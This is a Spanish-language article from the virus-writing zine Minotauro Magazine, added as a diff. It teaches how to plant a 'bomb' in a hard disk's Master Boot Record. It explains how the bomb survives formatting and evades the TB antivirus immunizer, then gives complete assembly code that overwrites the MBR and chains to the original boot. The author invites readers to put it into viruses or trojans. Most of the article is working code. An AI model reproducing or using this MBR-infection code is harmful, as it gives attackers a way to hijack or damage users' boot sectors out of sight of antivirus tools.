@@ -1,0 +1,139 @@
+Minotauro Magazine #7:
+			   Bombas de Master Boot Record
+				 Por Zarathustra
+
+% La Teoria %
+
+	En este articulo se explica como poner una bomba en la tabla de
+particion o MBR (Master Boot Record). Este es un buen lugar ya que sobrevive
+a un format... de esta manera si un virus pone una bomba en el MBR y el 
+usuario lo descubre y formatea el disco (practica comun en las casas de
+computacion ;-), la bomba sigue alli... de esta menera le damos la satifaccion
+al usuario de volver a formatear su disco pero si su ayuda ;-)
+
+	Primero, el MBR esta en el sector 1, lado 0, cilindro 0, los ultimos 
+66 bytes contienen informacion acerca de la particion y no deven ser tocados, 
+el MBR despues de ejecutarse ejecuta el boot. Una forma de poner una bomba ahi 
+es remplazar el MBR por la bomba y que la bomba se encarge de ejecutar el boot 
+despues. Otra forma es mover el MBR original a otro sector (como el 4) y poner 
+la bomba en su lugar, esta despues de ejecutarse, lee el sector 4 y lo ejecuta.
+Este metodo es muy fiable y no da ninguna alarma con el chequeador del TB,
+siempre que la bomba no deje nada resindente. Tambien puede desensamblarse una
+TP y agregarle la bomba en su codigo... No importa como se haga, siempre que se
+reemplaze el codigo de la TP hay que dejar intactos los 66 ultimos bytes.
+
+	Una aclaracion con respecto al inmunizador del TB, este hace un CRC 
+del BOOT y no del MBR, por lo tanto no puede delatar a la bomba, y si no se 
+deja codigo residente los 2 chequeos restantes tampoco detectan nada. De todos 
+modos lo normal en una bomba de MBR es que solo chequee una condicion y se 
+ejecute o no, sin dejar codigo residente, ademas son muy simples de eludir los 
+chequeos de memoria e int 13h
+
+% El Ejemplo %
+
+	El programa que sigue lee el MBR en un buffer de memoria y luego copia
+sobre este la bomba, y luego lo escribe en el sector 1, lado 0, cilindro 0 y
+termina.. es solo un instalador y puede modificarse facilmente para usarse en
+un virus, ademas de considerar las variables solo hay que remplazar los +100h
+por +BP. La bomba en si, al ejecutarse resta un 1k de la cantidad total de
+memoria que esta en en segmento 0 offset 413h, calcula el bloque de memoria
+al que se copiara y se copia entero ahi... luego de eso, salta para continuar
+ejecutandose en el nuevo bloque. Entonces lee el boot, vuelve a sumar 1k, que
+habia restado de memoria y ejecuta el boot... La memoria es reservada 
+unicamente para copiar la bomba a otro bloque y poder ejecutar el boot que
+se tiene que cargar en la misma direccion que el MBR, y despues liberada
+porque la bomba no deja nada residente, la idea es que chequee una condicion
+y actue, o bootee normalmente.
+
+	Bien, pueden usar esto en un virus o instalar la bomba con su 
+instalador en un file, para que el troyano instale la bomba o incluso como 
+metodo de seguridad, recuerden que el MBR es el primer programa que se 
+ejecuta, o sea que tienen el control antes que el mismo DOS.
+
+NOTA: el codigo que sigue puede optimisarse, pero de esta manera me parecio
+mas claro para el principiante. Ademas con una peque¤a modificacion puede
+quedar residente.
+
+.286
+code    segment 
+	ASSUME CS:CODE,DS:CODE,SS:CODE
+        org   0h             
+
+my_len  	equ buffer - offset newboot
+long_vir  	equ newboot -  offset instalador
+
+instalador:
+        mov ax,0201h				;Leo el MBR del en buffer.
+        mov cx,0001h 				;
+        mov dx, 80h  				;
+        lea bx, buffer+100h			;
+        int 13h
+
+        lea di, buffer+100h   			;sobreescribo boot
+        lea si, newboot+100h			;con mi rutina en memoria.
+        mov cx,my_len
+        rep movsb
+
+        mov ax,0301h             		;Copio la bomba al sector
+        mov cx,0001h				;1 lado 0 siindro 0.
+        lea bx, buffer+100h
+        int 13h
+
+fin:
+        mov ah, 4ch				;Sale.
+	int 21h
+	
+
+;==============================================================================
+;				BOMBA
+;==============================================================================
+newboot:
+	cli
+        xor ax,ax
+        mov ds,ax
+        mov si,07c00h
+        mov ss,ax
+        mov sp,si
+
+        mov ax, word ptr ds:[0413h]		;Decremento la cantidad de 
+	dec ax					;memoria, dejando el dato
+	mov word ptr ds:[0413h], ax		;en AX.
+	
+        mov cl,6
+        shl ax,cl   		             	 ;Calculo ennuevo bloque de
+						 ;memoria.
+
+        xor di,di               	       	 ;me copio a ese bloque.
+        mov es,ax
+        mov cx,my_len
+        rep movsb
+
+        push es
+        mov ax, offset memoria - long_vir	;Salta al nuevo
+        push ax					;bloque.
+        retf
+
+memoria:
+        sti
+        mov ax,0201h         			;leo el boot (sector 1, 
+        mov cx,0001h				;cilindro 0, lado  1), en
+	xor dx, dx				;el segmento 0 offset 7c00h.
+        mov es,dx				
+        mov dx, 0180h
+        mov bx,07c00h
+        int 13h
+
+        add word ptr ds:[0413h], 1		;Restaura la cantidad de 
+						;memoria.
+
+	push 0000				;Ejecuto el boot
+	push 7c00h
+	retf		
+
+	db 'Demostracion de bombas de MBR, para Minotauro Magazine'
+	db 'By Zarathustra [DAN]'
+
+buffer:
+
+code    ends
+end	instalador
